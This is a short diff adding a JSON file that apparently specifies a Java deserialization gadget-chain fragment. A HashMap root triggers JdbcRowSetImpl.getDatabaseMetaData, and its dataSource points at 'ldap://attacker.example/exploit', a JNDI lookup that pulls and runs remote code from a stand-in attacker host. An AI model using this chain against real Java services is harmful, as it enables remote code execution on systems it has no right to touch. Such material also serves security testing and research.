@@ -1,0 +1,14 @@
+{
+    "chain_type": "fragment: JdbcRowSetImpl JNDI sink (no TemplatesImpl, JDK 17+ compatible)",
+    "root_class": "java.util.HashMap",
+    "root_trigger": "readObject→hash→hashCode",
+    "links": [
+        {
+            "class": "com.sun.rowset.JdbcRowSetImpl",
+            "field_overrides": {
+                "dataSource": "ldap://attacker.example/exploit"
+            }
+        }
+    ],
+    "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
